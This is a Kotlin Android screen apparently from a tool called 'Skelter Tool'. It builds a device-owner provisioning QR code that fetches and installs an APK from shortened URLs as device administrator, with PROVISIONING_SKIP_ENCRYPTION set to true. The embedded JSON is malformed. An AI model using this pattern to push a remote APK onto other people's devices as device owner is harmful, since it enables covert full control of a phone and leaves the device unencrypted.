package com.watuke.watu.screens

import android.graphics.Bitmap
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.remember
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.graphics.toArgb
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.navigation.NavHostController
import com.google.zxing.BarcodeFormat
import com.google.zxing.qrcode.QRCodeWriter
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import okhttp3.OkHttpClient
import org.json.JSONObject
import java.io.IOException
import okhttp3.*
import androidx.compose.runtime.LaunchedEffect
import org.json.JSONException




@Composable
fun QrCodeScreen(
    navController: NavHostController
) {
    // State for provisioning data
    var provisioningData by remember { mutableStateOf<ProvisioningData?>(null) }

    // Effect to fetch data when screen loads
    LaunchedEffect(Unit) {
        val client = OkHttpClient()

        val request = Request.Builder()
            .url("https://goto.now/EZmPr")
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                if (response.isSuccessful) {
                    response.body()?.string()?.let { responseBody ->
                        try {
                            val jsonObject = JSONObject(responseBody)
                            provisioningData = ProvisioningData(
                                PROVISIONING_DEVICE_ADMIN_SIGNATURE_CHECKSUM = jsonObject.getString("PROVISIONING_DEVICE_ADMIN_SIGNATURE_CHECKSUM"),
                                PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION = jsonObject.getString("PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION")
                            )

                        } catch (e: JSONException) {
                            e.printStackTrace()
                        }
                    }
                }
            }

            override fun onFailure(call: okhttp3.Call, e: IOException) {
                e.printStackTrace()
            }
        })
    }

    // Generate QR code bitmap with the provisioning data
    val qrCodeBitmap = remember(provisioningData) {
        provisioningData?.let { data ->
            generateQRCode(
                """
                {
                    "PROVISIONING_DEVICE_ADMIN_SIGNATURE_CHECKSUM": "${data.PROVISIONING_DEVICE_ADMIN_SIGNATURE_CHECKSUM}",
                    "PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": "${data.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION}"
                     "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME": "com.watuke.app/com.watuke.app.MyDeviceAdminReceiver",
                    "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": "https://goto.now/FHnRe",
                    "android.app.extra.PROVISIONING_DEVICE_ADMIN_SIGNATURE_CHECKSUM": "UNgmnrL6DSTUdEtt8XB-Ig_9Xtc6lBH53Hr8KmZuv80=",
                    "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": true,
                    "android.app.extra.PROVISIONING_LEAVE_ALL_SYSTEM_APPS_ENABLED":true

                }
                """.trimIndent()
            )
        }
    }

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Color.Black)
    ) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.SpaceBetween
        ) {
            Text(
                text = "QR Code Provisioning",
                fontSize = 40.sp,
                fontWeight = FontWeight.Bold,
                color = Color.White,
                textAlign = TextAlign.Center,
                modifier = Modifier.padding(top = 80.dp)
            )

            Text(
                text = "Scan the QR code using another device to proceed.",
                fontSize = 20.sp,
                color = Color.Red,
                textAlign = TextAlign.Center,
                modifier = Modifier.padding(top = 40.dp)
            )

            Box(
                modifier = Modifier
                    .weight(1f)
                    .fillMaxWidth(),
                contentAlignment = Alignment.Center
            ) {
                qrCodeBitmap?.let { bitmap ->
                    Image(
                        bitmap = bitmap.asImageBitmap(),
                        contentDescription = "QR Code",
                        modifier = Modifier
                            .size(350.dp)
                            .background(Color.White)
                    )
                }
            }

            Button(
                onClick = { navController.navigate("MainScreen") },
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(vertical = 24.dp)
                    .height(56.dp),
                colors = ButtonDefaults.buttonColors(
                    containerColor = Color(0xFFE50914)
                ),
                shape = RoundedCornerShape(8.dp)
            ) {
                Text(
                    "Back",
                    color = Color.White,
                    fontSize = 16.sp,
                    fontWeight = FontWeight.Bold
                )
            }

            Text(
                text = "© 2025 Skelter Tool",
                color = Color.Gray,
                fontSize = 16.sp,
                textAlign = TextAlign.Center,
                modifier = Modifier
                    .fillMaxWidth()
                    .background(Color(0xFF1A1A1A))
                    .padding(16.dp)
            )
        }
    }
}

private fun generateQRCode(data: String): Bitmap? {
    return try {
        val qrCodeWriter = QRCodeWriter()
        val bitMatrix = qrCodeWriter.encode(data, BarcodeFormat.QR_CODE, 800, 800)
        val width = bitMatrix.width
        val height = bitMatrix.height
        val bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)

        for (x in 0 until width) {
            for (y in 0 until height) {
                bitmap.setPixel(x, y, if (bitMatrix[x, y]) Color(0xFFE50914).toArgb() else Color.White.toArgb())
            }
        }
        bitmap
    } catch (e: Exception) {
        e.printStackTrace()
        null
    }
}